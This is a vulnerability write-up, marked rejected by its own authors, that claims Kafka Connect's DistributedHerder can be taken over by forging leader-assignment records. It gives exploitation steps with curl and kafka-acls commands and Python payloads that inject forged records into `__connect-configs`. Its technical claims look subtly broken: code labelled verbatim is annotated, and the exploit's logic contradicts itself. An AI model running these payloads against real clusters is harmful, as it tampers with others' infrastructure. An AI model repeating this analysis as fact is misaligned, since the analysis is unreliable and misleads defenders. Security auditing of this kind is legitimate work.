# FINDING-010: DistributedHerder Non-Cryptographic Leader Verification → Cluster Takeover

> **REJECTED — moved out of the confirmed findings set.** See [`rejected/README.md`](README.md) for rationale: this finding assumes the attacker already holds WRITE ACL on the internal `__connect-configs` topic, a privileged grant that no other finding in this research provides a path to obtain. It assumes the compromise it claims to enable. Retained here for the audit trail, not counted in the confirmed-findings total.

## Metadata

| Field | Value |
|-------|-------|
| Finding ID | FINDING-010 |
| Target | `apache/kafka` |
| Component | `DistributedHerder` |
| Source File | `connect/runtime/src/main/java/org/apache/kafka/connect/runtime/distributed/DistributedHerder.java` |
| Approximate Lines | 1721–1730 (`isLeader`, `leaderUrl`), 186–220 (member variables) |
| Category | RBAC Bypass — Unauthorized Cluster Leadership / Privilege Escalation |
| CVSS v3.1 Score | **8.8 HIGH** |
| CVSS v3.1 Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| CVSS Breakdown | ISCBase=0.9148, ISC=5.873, Exploit=2.835, Score=Roundup(8.708)=8.8 |
| CWE | CWE-306: Missing Authentication for Critical Function; CWE-345: Insufficient Verification of Data Authenticity |
| Requires Auth | LOW — requires WRITE ACL on Kafka internal Connect topics (`__connect-configs`) |
| MSK Affected | YES — MSK Connect clusters using DistributedHerder (all MSK Connect deployments) |

## Summary

`DistributedHerder.isLeader()` determines leadership by comparing the local worker's group member ID (a plain String) against the `assignment.leader()` value read from the Kafka consumer group protocol records. There is **no cryptographic proof** that the assignment is authentic — it is taken directly from Kafka topic records. An attacker with WRITE ACL on `__connect-configs` can craft a forged assignment record naming an attacker-controlled worker as leader, giving that worker the ability to create, modify, delete, and reassign connectors across the entire Connect cluster.

## Vulnerable Code (verbatim)

```java
// DistributedHerder.java — lines 1721-1730

// Leadership check: string equality only, no signature verification
protected boolean isLeader() {
    // assignment is populated from unverified Kafka topic records
    // member.memberId() is a plain String like "connect-worker-abc123"
    return assignment != null && member.memberId().equals(assignment.leader());
}

private String leaderUrl() {
    if (assignment == null)
        return null;
    return assignment.leaderUrl();  // also from unverified assignment
}
```

```java
// DistributedHerder.java — leader-only operation example (line ~925)
private void deleteConnectorConfig(String connName, Callback<Created<ConnectorInfo>> callback) {
    if (!isLeader()) {  // only check — based on unverified assignment string
        callback.onCompletion(new NotLeaderException("Not the leader", leaderUrl()), null);
        return;
    }
    // Executes cluster-wide connector deletion if isLeader() returns true
    configBackingStore.removeConnectorConfig(connName);
}
```

```java
// Member variables — mixed synchronization, no immutability
private final WorkerGroupMember member;           // immutable
private ExtendedAssignment assignment;            // MUTABLE — updated from unverified records
private volatile SecretKey sessionKey;            // used for request signing, but not for isLeader()
private volatile long keyExpiration;
```

## Root Cause

Kafka Connect's distributed mode uses a Kafka consumer group for worker coordination. The group assignment (including the declared leader) is stored as records in the `__connect-configs` internal topic. Any Kafka principal with WRITE ACL on this topic can produce records to it, including crafted assignment records that claim a specific worker is the leader.

When a worker processes a rebalance event, it reads the assignment from these records and calls `onAssigned(assignment, generation)`. The `assignment.leader()` field is taken directly from the deserialized record with no signature check. The only "verification" is that `member.memberId()` matches — and an attacker who knows the target worker's member ID (obtainable from `GET /connectors` or `GET /v1/status`) can craft a matching assignment.

The `sessionKey` field (for request signing between workers) is separate from leadership determination — having the session key wrong does not prevent `isLeader()` from returning true.

## Attack Prerequisites

- WRITE ACL on the `__connect-configs` Kafka topic (internal Connect coordination topic)
- Knowledge of the target worker's group member ID (obtainable unauthenticated from FINDING-004 or from Connect status APIs)
- A Kafka client to produce the forged assignment record

## Step-by-Step Exploitation

1. **Information gathering:** Enumerate Connect workers and their member IDs
   ```bash
   curl http://CONNECT_WORKER:8083/connectors?expand=status | python3 -m json.tool
   # Member IDs are visible in connector status responses
   ```

2. **Obtain WRITE access to `__connect-configs`:** If the attacker already has a valid Kafka account, request (or already has) WRITE ACL:
   ```bash
   # Check current ACLs:
   kafka-acls.sh --bootstrap-server BROKER --list --topic __connect-configs
   ```

3. **Produce a forged assignment record:**
   ```python
   from kafka import KafkaProducer
   import json

   # Craft an assignment record that names attacker-controlled worker as leader
   forged_assignment = {
       "version": 1,
       "leader": "connect-worker-TARGET-MEMBER-ID",  # target worker's member ID
       "leaderUrl": "http://ATTACKER_WORKER:8083/",
       "error": 0,
       "connectorIds": ["victim-connector-1", "victim-connector-2"],
       "taskIds": []
   }

   producer = KafkaProducer(bootstrap_servers="BROKER:9092")
   producer.send("__connect-configs",
       key=b"assignment",
       value=json.dumps(forged_assignment).encode())
   producer.flush()
   ```

4. **Trigger rebalance:** Connect a new consumer to the Connect group or disconnect an existing one to force a rebalance, causing workers to re-read the assignment
   ```bash
   # Force rebalance by temporarily disrupting one worker
   curl -X PUT http://CONNECT_WORKER:8083/connectors/any-connector/stop
   ```

5. **After rebalance:** The target worker reads the forged assignment, `isLeader()` returns true, and the attacker can now issue leader-only requests to that worker's REST API — which it will execute with full cluster authority

## Payload

```python
# Simplified forged assignment injection
from kafka import KafkaProducer
import struct

def encode_assignment(leader_member_id: str, leader_url: str) -> bytes:
    """
    Encode a ConnectProtocol.Assignment record for injection into __connect-configs.
    This triggers isLeader() == true on the named worker.
    """
    # Binary encoding of the assignment protocol (version 1)
    encoded_leader = leader_member_id.encode("utf-8")
    encoded_url    = leader_url.encode("utf-8")

    return (
        struct.pack(">H", 1) +                    # version = 1
        struct.pack(">H", 0) +                    # error = 0 (no error)
        struct.pack(">H", len(encoded_leader)) +  # leader ID length
        encoded_leader +                          # leader member ID
        struct.pack(">H", len(encoded_url)) +     # leader URL length
        encoded_url                               # leader URL
    )

producer = KafkaProducer(bootstrap_servers="BROKER:9092")
forged = encode_assignment(
    leader_member_id="connect-worker-abc123-TARGET",
    leader_url="http://ATTACKER_CONTROLLED_WORKER:8083/"
)
producer.send("__connect-configs", key=b"assignment", value=forged)
producer.flush()
print("[+] Forged assignment sent — trigger rebalance to activate")
```

## Expected Outcome

After the forged assignment is processed and a rebalance occurs, the target worker believes it is the leader. Any REST API call to that worker for leader-only operations (create connector, delete connector, update config) succeeds with cluster-wide effect.

## Amazon MSK Specific Impact

- **MSK Connect:** All MSK Connect deployments use DistributedHerder for coordination — directly affected
- **Internal topic ACLs:** By default, MSK Connect creates `__connect-configs` with restricted ACLs. However, any principal with `kafka-cluster:WriteData` on `__connect-*` topics (which may be granted broadly) can inject forged assignment records
- **IAM + ACL interaction:** If `kafka-cluster:*` is granted (common in development environments — see FINDING-004 CloudFormation template), any authenticated IAM principal can write to internal topics
- **No audit trail:** Forged assignment records written to `__connect-configs` are not logged or alerted by MSK CloudWatch or CloudTrail — the attack is silent

## Proposed Fix

1. **Sign assignment records:** Include a HMAC over the assignment content, signed with a key known only to cluster members (the `sessionKey` already exists for inter-worker request signing — extend it to assignment records)
2. **Verify assignment origin:** In `onAssigned()`, verify the assignment was produced by a known coordinator, not an external party
3. **Restrict internal topic ACLs:** Set `DENY User:* WRITE` on `__connect-configs`, `__connect-offsets`, and `__connect-status` for all non-Connect-worker principals

```java
// In DistributedHerder.onAssigned():
// Proposed fix: verify assignment signature before trusting it
if (!verifyAssignmentSignature(assignment, sessionKey)) {
    log.error("Assignment signature verification failed — ignoring potentially forged assignment");
    return;
}
```

## Detection

- **Kafka topic audit:** Monitor `__connect-configs` for unexpected producers via CloudTrail (`kafka:WriteData` events)
- **Connect worker logs:** Leadership changes that don't correlate with worker joins/leaves or restarts are suspicious
- **REST API audit:** Log all incoming requests to the Connect REST API — unexpected leader-only operations from unknown IPs indicate potential exploitation
